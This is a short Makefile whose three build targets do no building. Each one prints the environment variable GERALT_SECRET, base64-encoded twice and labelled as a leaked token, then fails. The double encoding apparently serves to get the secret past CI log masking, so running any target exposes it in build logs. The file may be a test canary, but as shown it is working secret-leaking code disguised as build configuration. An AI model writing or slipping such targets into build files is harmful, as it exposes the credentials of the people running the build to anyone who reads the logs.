.PHONY: build_base build_base_test build_test

build_base:
	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"; exit 1

build_base_test:
	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"; exit 1

build_test:
	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"; exit 1
